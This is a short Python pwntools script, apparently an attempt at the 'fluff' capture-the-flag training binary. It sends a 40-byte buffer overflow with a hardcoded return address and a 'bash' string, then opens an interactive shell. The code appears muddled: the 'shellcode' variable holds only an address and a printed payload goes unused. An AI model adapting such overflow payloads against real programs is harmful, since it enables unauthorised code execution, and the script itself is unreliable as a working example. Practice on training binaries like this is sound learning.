from pwn import *

execute = p64(0x0000000000400810)
sh = "A" + "bash\x00\x00\x00\x00"

offset = 40
shellcode = execute

print offset*'A' + shellcode

bin = process('fluff')
bin.sendline(sh + (offset - len(sh))*'A' + shellcode)
bin.interactive()